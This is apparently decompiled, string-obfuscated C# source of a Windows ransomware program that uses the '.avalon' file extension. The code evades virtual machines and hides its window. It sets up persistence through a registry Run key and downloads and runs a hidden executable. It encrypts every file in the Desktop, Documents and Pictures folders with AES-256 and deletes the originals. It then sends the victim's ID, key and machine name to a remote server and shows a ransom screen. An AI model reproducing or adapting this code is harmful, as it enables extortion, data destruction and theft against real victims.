using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using ns3;

namespace ns2;

public class GForm0 : Form
{
	private const bool bool_0 = true;

	private const bool bool_1 = true;

	private const bool bool_2 = true;

	private const bool bool_3 = true;

	private const string string_0 = ".avalon";

	public string string_1 = Environment.UserName;

	private WebClient webClient_0 = new WebClient();

	private static string string_2 = GClass211.smethod_0("");

	private string string_3 = GClass211.smethod_0("ÿǼʑιү\u05a1ڣޥ\u08eaছ\u0aa9னವඪຩ\u0fb4Ⴃᆳእ᎒ᒓᖷᛥ។ᣏ\u19cb᪘ᯑ\u1cdf\u1dd9ố\u1fc0ₒ⇐⋂⏊⒎◈⛂⟈⣘⧐⫘⯓ⳃⷁ⺊⾩ル㇇㊀㏦㓱㗨㚼㟬㣻㧷㫬㮷㳢㷺㺴㿦䃼䇽䋿䏬䓥䖭䛸䟣䣯䧤䪨䯴䳣䷫仠侣傷冱劤卟吉唒嘎圏堒奙娗嬑屖崗帝弇怑愞戙持摎攙昃杋栞椁樁欔汆洄渀漇瀐焄爓猬瑤畽癯睭砣礟稙笺簔紒縚缗耽脦舡茥萖蔵蘮蜪蠚褈詺謁豵货踽輓逗鄮鈸鍨鑘镧际靁頰饸驞魃鱓鵇鸔齇ꁚꅐꉄꌏꑋꕀꙍꝂꡆ꤉꩑ꭈ걓굗긄꽗끐녀뉎덬둿땾뙨띲롵륷머뭞뱒봹븴뽣쁱성쉳썠쑪앨올읪졤쥭쨨쭲챵쵠칶콭큣텬퉥폟풊햒훆ퟛ\ud891\ud998\uda9a\udb96\udc8f\udd94\ude96\udf9c\ue09d\ue1b1\ue280\ue39d\ue481\ue599\ue683\ue785\ue887\ue988\uea81\ueb8b\uecc8\ued86\uee8b\uef8e\uf0e8\uf1a0\uf286\uf3ab\uf4bb\uf5af\uf6fc\uf7af\uf8b2隸窱ﯷﲡﶴﺽﾧòƷʿνӮ\u05a2ڹ\u07b9\u08ea\u09bbભழಶඪສ\u0fb0ႧᇡኡᏑᓚᖝᛋ\u17deᢚ\u19ce\u1ad1ᯛ\u1cdaᶕệῖ\u20dc⇕⊐⏖Ⓛ◘⚌⟒⣅⧜⫚⮇ⳓⷋ⻍⿒プ㇄㊀㏯㓿㗮㛯㟬㣵㧫㫼㮷㳷㷻㻰㾳䃶䇴䋳䏽䓷䗽䛸䟤䣸䦧䪂䯎䳀䶥仝俌僗冡勔匭吧啝嘨圴塚夭娭嬥尸嵕帻張怴慑戠挬摎攢显杋校椠樤欫汆洷渥漭瀱焮爭猈琟甏瘙睻砛礕稔筷簏級縁缁聲脗舙范萋蔞虬蜜蠃褅訄譧谄贀蹤輇逇鄍鈅鍫鑻镹阜靺顴饽騘魮鱹鵠鸔齤ꁽꅿꉤꌥꑬꕨꘌꝪꡨꥥꩭ\uab07걲굪긄꽡끭녮뉴댿둎땞똼띎롊뤹멙뭐뱗뵜빚뼲쀘셔쉾썬쑼앴왼읿졯쥭쨨쭡챯쵩칡콰퀸턋");

	private string string_4 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string string_5 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string string_6 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int int_0 = 0;

	private string string_7 = GClass211.smethod_0("");

	private bool bool_4;

	private GClass210 gclass210_0 = new GClass210();

	private Random random_0 = new Random();

	private IContainer icontainer_0;

	private Label label_0;

	private Label label_1;

	private Label label_2;

	private TextBox textBox_0;

	private Label label_3;

	private TextBox textBox_1;

	private Label label_4;

	private Label label_5;

	private PictureBox pictureBox_0;

	private Label label_6;

	[DllImport("wininet.dll")]
	private static extern bool InternetGetConnectedState(out int int_1, int int_2);

	public GForm0()
	{
		method_10();
	}

	private bool method_0()
	{
		bool_4 = InternetGetConnectedState(out var _, 0);
		return bool_4;
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		method_0();
		if (!bool_4)
		{
			MessageBox.Show(GClass211.smethod_0("\u000eģȪ\u0325ПՍوݎ࡞च\u0a40\u0b57\u0c42ഖ\u0e5dཕ၅ᅗሑፙᑁᕚᙈ\u175eᡅ᥏\u1a5dᬈ᱄ᵉṋὊ⁆⅁≕⍉⑰╰☽❾⡾⥼⩶⭪Ⱳⴶ\u2e67⽡ぽㅼ㉸㍾㑨㔮㙹㝤㡢㥹㨩㭸㱵㵩㹢㽶䁢䅯䈠"));
			Application.Exit();
		}
		if (method_8())
		{
			MessageBox.Show(GClass211.smethod_0("Cŷɶ\u036cѰԠ"));
			Application.Exit();
		}
		string_7 = method_7();
		method_6();
		method_2();
		method_1();
		method_9(string_4);
		method_9(string_5);
		method_9(string_6);
		if (int_0 > 0)
		{
			method_4();
			method_5();
		}
		else
		{
			Console.Out.WriteLine(GClass211.smethod_0("ZżȲͷѹգ٫ݾ\u082cॿ\u0a65\u0b29౭൩\u0e65\u0f77ၽᅳቶጯ"));
			Application.Exit();
		}
	}

	public static void smethod_0(string string_8, string string_9, string string_10)
	{
		WebClient webClient = new WebClient();
		try
		{
			webClient.UploadValues(string_8, new NameValueCollection
			{
				{
					GClass211.smethod_0("dũɫͰѦլٵ"),
					string_9
				},
				{
					GClass211.smethod_0("}ŴɣͷѪբٯݤ"),
					string_10
				}
			});
		}
		catch (WebException ex)
		{
			Console.WriteLine(ex.Message.ToString());
		}
	}

	private void method_1()
	{
		string fileName = GClass211.smethod_0("Hİɕ\u0354ђյ٠ݶ\u0870फ़\u0a5d") + Environment.UserName + GClass211.smethod_0("DŖɦ\u0365ѐղ٦ݰࡌढ़\u0a61୬ౡ\u0d62\u0e64\u0f6eၔᅴቮ፤ᐪᕡᙣ\u1775");
		webClient_0.DownloadFile(GClass211.smethod_0("4įȮ\u0329Ыխٹݺ࠷ष\u0a3c\u0b7fఴദ\u0e3d༮ဣᄹሮጨᐸᔷᙨᜦᠫ\u192e\u1a6dᬠ\u1c34ᵋṟ\u1f5e\u2054⅖≟⍗\u244c╄☙✂⠂⤀⨃⬄Ⰱⴝ⸙⼔〟ㄝ㈜㌙㐟㔟㘓㜕㠓㤌㨚㬕㰔㴦㸭㼩䀩䄣䈣䌫䐠䔢䘧䜦䠬䤧䨡䬣䰿䵫乫佡偓典剢卨呬啨噱坶堪奡婣孵"), fileName);
		Process.Start(new ProcessStartInfo
		{
			FileName = fileName,
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}

	public void method_2()
	{
		Registry.CurrentUser.OpenSubKey(GClass211.smethod_0("~ţɭ;Ѿթٵݣ\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.SetValue(GClass211.smethod_0("DŻɿʹѠչپܬࡊॺ\u0a79\u0b64౮\u0d65\u0e64\u0f70\u106aᅭቯ"), Application.get_ExecutablePath().ToString());
	}

	private void method_3()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(GClass211.smethod_0("kŇȀ\u0366ѱըؼݿ\u0875ॷ੬ଷ౽ൻ\u0e7bཤ\u1032ᅹቿ፸ᐮᕹᙣᜫᡨ\u197c\u1a71ᬧᱤᵬṰὠ\u206dⅨ≮⎌ⓞ▊⚙⟛⢙⦘⪖⯗Ⲟⶐ⺘⾃ヒㆈ㊟㎚㓀㗧㚵㞄㢟㧉㪋㮆㲈㷅㺑㾐䂇䇁䊈䎫䒪䖭䚯䟡䣵䧶䪯䮠䲡䷻亹侼傽冿加厮咷嗣嚯垤墧姦嫨宨岴工庬德悶憱抳掅撑斒曋柌棍榗櫛毘泟淛滖濒烁燔犞珌瓁痀皃瞋磅秛窈篏糒緑绔翐肘膎芏菳蓱藾蛽蟷裸觰諬说賹跼軺迠邼釲鋿鏢钡闯雹韲飕駫髡鯳鳥鷪黭鿭ꃱꆡꊊꌷꐑꔊꙜꜘꠛꤗ꩘\uab1e걖괞긚꼜뀅녑눙덏됙딄똀뜇롊뤎먍묓뱆봈븝뽃쀄섈숌쌺쐭약옾윺젹줲쩧쭝찁촰카켲퀠턴퉰팡퐡픹홬휣\ud82f\ud93b\uda2d\udb67\udc32\udd2a\ude64\udf30\ue021\ue120\ue22d\ue31f\ue451\ue548\ue64e\ue71b\ue859\ue94c\uea4b\ueb43\uec59\ued58\uee51\uef41\uf041\uf11d\uf210\uf356\uf441\uf558\uf60c\uf748\uf84b磊行ﭔﱃ\ufd4b﹀＃MŏɅ\u033fѸմ\u0670ݾ࠺७\u0a77ଷ౹ൠ\u0e66༳ၷᅼቱ፦ᑢᔭ᙭ᝥᡮ\u1929\u1a7f᭢\u1c26ᵦṥὭ\u2008ⅲ≥⎑⒚◝⚅➔⢏⧙⪜⮒ⲕⶇ⺍⾃ゆ㆔㊔㏏㒘㖈㚞㞘㢃㦆㪆㯉㳆㶫㺋㿃䂍䆏䊅䏿䒽䖼䚲䟻䢾䦼䪻䮥䲯䶥亠俳傫冾劥厽哮喫嚥垧墯妺嫨宰岯嶱庬徬悷憵拠提擋族暜某棟槀檖殽泳淃滑濁烋熑狀珌璎病盍矘碊秚竘篂糅緌绅翏肂臆苅菱蓻藯蛽蟯裿觽誸诼賳跬躴迤郺釸鋳鏧钮闤雿鞫飿駺髭鯣鲦鷣黫鿱ꂢꇤꋮꌜꐇꔍꘈ\ua712ꠕꤗ꩘ꬖ갘광깔꼄뀗녑눃댛됁딟똉띡렁뤌먑묔뱆봄븊뼇쁂섈숄쌬쑾씲옲읻젵줬쨪쭷찥촰츦켥퀷턣툣퍡푄픚혩흫\ud839\ud93c\uda2f\udb20\udc23\udd36\ude30\udf63\ue03b\ue12e\ue235\ue31f\ue44a\ue552\ue61c\ue74f\ue84f\ue94b\uea56\ueb17\uec59\ued53\uee52\uef13\uf04b\uf15e\uf245\uf35d\uf40e\uf54c\uf642\uf75f\uf843契艹פֿﱔﵐ﹗＃WŏɔͶѲԽ٥ݴ\u086fह੨୶౯വ\u0e75\u0f7dၶᄱቷ፪ᑺᔭᙪᝢᡦᥬ\u1a7bᬧᱤᵤṧὨ\u202cℋ"));
	}

	private void pictureBox_0_Click(object sender, EventArgs e)
	{
		method_3();
	}

	private void method_4()
	{
		StreamWriter streamWriter = new StreamWriter(string_4 + GClass211.smethod_0("Oŀɔ\u0351ыՑـ\u0749\u0825५\u0a7f୩౫൩\u0e6b༪ၷᅺት"));
		streamWriter.WriteLine(string_3);
		streamWriter.WriteLine(string_2);
		streamWriter.Close();
	}

	private void method_5()
	{
		string string_ = new WebClient().DownloadString(GClass211.smethod_0("IŔɫ\u036eѮԦش\u0735ࡩॹ\u0a64\u0b62\u0c70൶\u0e7a\u0f7cဿᅳበ፣ᐢᕾᙪ\u177dᠦ\u197dᩉ᭑ᱵᵦṦ\u1f46‱"));
		((Control)textBox_0).set_Text(webClient_0.DownloadString(GClass211.smethod_0("IŔɫ\u036eѮԦش\u0735ࡩॹ\u0a64\u0b62\u0c70൶\u0e7a\u0f7cဿᅳበ፣ᐢᕾᙪ\u177dᠦ\u196eᩏ\u1b37ᱽᵶṶὤ\u2063")));
		((Form)this).set_Opacity(100.0);
		((Form)this).set_ShowInTaskbar(true);
		((Control)label_5).set_Text(GClass211.smethod_0("_źɭ\u0375Ѩդ٩ݦ࠸ड") + Environment.MachineName + GClass211.smethod_0("/Ĭ") + Environment.UserName);
		int num = random_0.Next(9999999);
		((Control)label_4).set_Text(GClass211.smethod_0("VŦɍ\u0347иԡ") + num);
		string string_2 = GClass211.smethod_0("Pźɰ\u0360Ѩՠٻݧࡢ\u0962ਫ\u0b5a౨ൻ\u0e74\u0f71\u106aᅶቧጸᐡ") + string_7 + GClass211.smethod_0("\v") + ((Control)label_4).get_Text() + GClass211.smethod_0("\v") + ((Control)label_5).get_Text();
		smethod_0(string_, string_2, GClass211.smethod_0("BŤɯ\u0367ЧՕ٠ݪࡧ१ੳ"));
		Class4.Default.pcid = num.ToString();
		method_3();
	}

	private void method_6()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
	}

	public string method_7()
	{
		return gclass210_0.method_1();
	}

	public bool method_8()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(GClass211.smethod_0("qńɌͺѽթؼ\u0731࠺ॿ੪\u0b78౻വใ\u0f7aၼᄢሢፐᑍᕢᙡ\u177b\u187f\u197d\u1a6d᭵᱕ᵼṷί\u2067Ⅼ"));
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						string text = current.get_Item(GClass211.smethod_0("AŪɤͼѮզ٥ݱ\u0871ॱ੧୳")).ToString()!.ToLower();
						if ((text == GClass211.smethod_0("xŽɰ\u0360Ѿգ٠ݨ\u0879ब੨\u0b65౻൸\u0e68\u0f74\u1064ᅰቪ፭ᑯ") && current.get_Item(GClass211.smethod_0("Hūɧ\u0367ѭ")).ToString()!.ToUpperInvariant().Contains(GClass211.smethod_0("Qŏɗ\u0350іՃ\u064d"))) || text.Contains(GClass211.smethod_0("pŨɳ\u0362Ѱդ")) || current.get_Item(GClass211.smethod_0("Hūɧ\u0367ѭ")).ToString() == GClass211.smethod_0("\\Šɺͳѳդ٨\u0741\u086dॹ"))
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return false;
	}

	private void method_9(string string_8)
	{
		try
		{
			string[] files = Directory.GetFiles(string_8);
			foreach (string text in files)
			{
				if (!text.Contains(GClass211.smethod_0(")ŧɳ\u0365ѯխٯ")))
				{
					Console.Out.WriteLine(GClass211.smethod_0("Iťɩͻѱշٲݬࡪ।ਸଡ") + text);
					smethod_1(text, string_7);
				}
			}
			files = Directory.GetDirectories(string_8);
			foreach (string string_9 in files)
			{
				method_9(string_9);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void smethod_1(string string_8, string string_9)
	{
		byte[] array = smethod_2();
		FileStream fileStream = new FileStream(string_8 + GClass211.smethod_0(")ŧɳ\u0365ѯխٯ"), FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(string_9);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_8, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(GClass211.smethod_0("BŴɷ\u036bѱԸء") + ex.Message);
		}
		finally
		{
			string_2 = string_2 + string_8 + GClass211.smethod_0("\v");
			int_0++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(string_8);
		}
	}

	public static byte[] smethod_2()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_10()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_0254: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_0384: Unknown result type (might be due to invalid IL or missing references)
		//IL_038e: Expected O, but got Unknown
		//IL_0422: Unknown result type (might be due to invalid IL or missing references)
		//IL_042c: Expected O, but got Unknown
		//IL_04a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b2: Expected O, but got Unknown
		//IL_05ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d4: Expected O, but got Unknown
		//IL_074a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0754: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm0));
		label_0 = new Label();
		label_1 = new Label();
		label_2 = new Label();
		textBox_0 = new TextBox();
		label_3 = new Label();
		textBox_1 = new TextBox();
		label_4 = new Label();
		label_5 = new Label();
		pictureBox_0 = new PictureBox();
		label_6 = new Label();
		((ISupportInitialize)pictureBox_0).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label_0).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_0).set_Location(new Point(12, 9));
		((Control)label_0).set_Name(GClass211.smethod_0("jŤɦ\u0366Ѯ\u0530"));
		((Control)label_0).set_Size(new Size(341, 33));
		((Control)label_0).set_TabIndex(0);
		((Control)label_0).set_Text(GClass211.smethod_0("@ŷɢ\u0364еղٺݾ\u0874\u0963ਯ୯౿൩ห\u0f6f\u1067ᅫት\u137fᑵᕰᙦᝦᠠ"));
		label_0.set_TextAlign((ContentAlignment)2);
		((Control)label_1).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_1).set_Location(new Point(12, 42));
		((Control)label_1).set_Name(GClass211.smethod_0("jŤɦ\u0366ѮԳ"));
		((Control)label_1).set_Size(new Size(341, 42));
		((Control)label_1).set_TabIndex(1);
		((Control)label_1).set_Text(GClass211.smethod_0("\u0005Ĵȯ\u032bѸԱؿ\u0739࠱ठੲରఢപ\u0e6e༨ဢᄨሸጰᐸᔳᘣᜡᡤ\u1934ᨫ\u1b35\u1c28ᴟṍὉ⁎⅔≔⍞␘╖♚❒⡛⥁⩛⭅ⱘⴏ⹏⽃えㄋ㈧㌣㑆㕈㘆㝊㡊㥆㨂㭂㱁㵱㸾㽹䁹䅸䉨䍠䑨䕣䘶䝡䡼䥶䩿䬱䱧䵦乺佥偣兾剾匩呧啲噴圥塯奦婻嬯"));
		label_1.set_TextAlign((ContentAlignment)2);
		((Control)label_2).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_2).set_Location(new Point(12, 84));
		((Control)label_2).set_Name(GClass211.smethod_0("jŤɦ\u0366ѮԲ"));
		((Control)label_2).set_Size(new Size(341, 78));
		((Control)label_2).set_TabIndex(2);
		((Control)label_2).set_Text(GClass211.smethod_0("\rĥɢ\u0338ЯՊ؞\u074a\u085d\u0955\u0a4eଙ\u0c5e൞๚ཐ၇ᄓቐፐᑓᕄᘎ\u175eᡉ᥅ᩎᬉᰝᴗḂἨ\u202e⅔≍⍓\u2454╷☾❲⡺⤻⩸⭰ⱬ\u2d74\u2e79⽼ぺㄳ㉦㍾㐰㕻㙦㝤㡿㤫㩫㭭㱬㵵㹣㽶䁷䄹䈏䌋"));
		label_2.set_TextAlign((ContentAlignment)2);
		((Control)textBox_0).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox_0).set_Location(new Point(12, 166));
		((Control)textBox_0).set_Name(GClass211.smethod_0("|Ţɾͱцլٺ\u0730"));
		((TextBoxBase)textBox_0).set_ReadOnly(true);
		((Control)textBox_0).set_Size(new Size(341, 24));
		((Control)textBox_0).set_TabIndex(3);
		((Control)textBox_0).set_Text(GClass211.smethod_0("\u0011ėə\u0359џհ\u065eݜࡔढ़\u0a77ୠ౧ൿ\u0e4cཫၰᅰቀፎᐼᕋᘿᝩᡳᥙ\u1a5d᭨᱾ᵒṢὙ⁻ⅻ"));
		textBox_0.set_TextAlign((HorizontalAlignment)2);
		((Control)label_3).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_3).set_Location(new Point(13, 203));
		((Control)label_3).set_Name(GClass211.smethod_0("jŤɦ\u0366ѮԵ"));
		((Control)label_3).set_Size(new Size(341, 104));
		((Control)label_3).set_TabIndex(4);
		((Control)label_3).set_Text(GClass211.smethod_0("\u0010ĶȻ\u032bпլؿܢࠨ\u093c੧ଣనഥส༮ၡᄵቌጞᑊᕕᙏ\u1752᠙\u1941\u1a58\u1b43᱇ᴹḹὢ⁒ⅹ≫⌂␍╹♘❏⡛⥆⩆⭋ⱀⴄ⹂⽌ぅ\u3100㉝㍷㑩㕿㙴㝳㡷㤕㨝㭢㱧㵵㹽㽡䁰䅳䉻䍧䑢䕢䙂䝎䠧䤅䨍䭃䱨䵥乪佮倻"));
		label_3.set_TextAlign((ContentAlignment)2);
		((Control)textBox_1).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox_1).set_Location(new Point(12, 310));
		((Control)textBox_1).set_Name(GClass211.smethod_0("|Ţɾͱцլٺ\u0733"));
		((TextBoxBase)textBox_1).set_ReadOnly(true);
		((Control)textBox_1).set_Size(new Size(341, 24));
		((Control)textBox_1).set_TabIndex(5);
		((Control)textBox_1).set_Text(GClass211.smethod_0("sŶɴʹѭղ\u0670ݾ\u087f\u094f\u0a7e\u0b7f\u0c63ൿ\u0e65ཧၥᅦቯ፩ᐪᕠ᙭ᝬ"));
		textBox_1.set_TextAlign((HorizontalAlignment)2);
		((Control)label_4).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_4).set_Location(new Point(12, 337));
		((Control)label_4).set_Name(GClass211.smethod_0("nŢɉ\u0365ѡէ٭"));
		((Control)label_4).set_Size(new Size(341, 20));
		((Control)label_4).set_TabIndex(6);
		((Control)label_4).set_Text(GClass211.smethod_0("VŦɍ\u0347иԡ"));
		((Control)label_5).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_5).set_Location(new Point(12, 357));
		((Control)label_5).set_Name(GClass211.smethod_0("xſɮ\u0378ѧթ٪ݣࡉ॥\u0a61୧౭"));
		((Control)label_5).set_Size(new Size(341, 22));
		((Control)label_5).set_TabIndex(7);
		((Control)label_5).set_Text(GClass211.smethod_0("_źɭ\u0375Ѩդ٩ݦ࠸ड"));
		((Control)pictureBox_0).set_Cursor(Cursors.get_Help());
		pictureBox_0.set_Image((Image)(object)Class5.information1);
		((Control)pictureBox_0).set_Location(new Point(311, 124));
		((Control)pictureBox_0).set_Name(GClass211.smethod_0("{ţɪͼѲմ٠\u0746\u086cॺਰ"));
		((Control)pictureBox_0).set_Size(new Size(39, 38));
		pictureBox_0.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox_0.set_TabIndex(11);
		pictureBox_0.set_TabStop(false);
		((Control)pictureBox_0).add_Click((EventHandler)pictureBox_0_Click);
		((Control)label_6).set_Font(new Font(GClass211.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_6).set_Location(new Point(9, 390));
		((Control)label_6).set_Name(GClass211.smethod_0("jŤɦ\u0366ѮԶ"));
		((Control)label_6).set_Size(new Size(341, 18));
		((Control)label_6).set_TabIndex(12);
		((Control)label_6).set_Text(GClass211.smethod_0("[ůɹͻѹջش\u0741\u0873ॿ\u0a63ୠ\u0c63ൺ\u0e6d\u0f79ၯᄩቇ፵ᑯᕢ᙭\u176dᡣᥭ"));
		label_6.set_TextAlign((ContentAlignment)2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkCyan);
		((Form)this).set_ClientSize(new Size(365, 417));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label_6);
		((Control)this).get_Controls().Add((Control)(object)pictureBox_0);
		((Control)this).get_Controls().Add((Control)(object)label_5);
		((Control)this).get_Controls().Add((Control)(object)label_4);
		((Control)this).get_Controls().Add((Control)(object)textBox_1);
		((Control)this).get_Controls().Add((Control)(object)label_3);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject(GClass211.smethod_0(".Žɠ\u036eѵԫ\u064dݠ\u086d९")));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass211.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text(GClass211.smethod_0("Lźɪ\u0366Ѧզاݺ\u0825\u0949\u0a62୫౯"));
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((ISupportInitialize)pictureBox_0).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
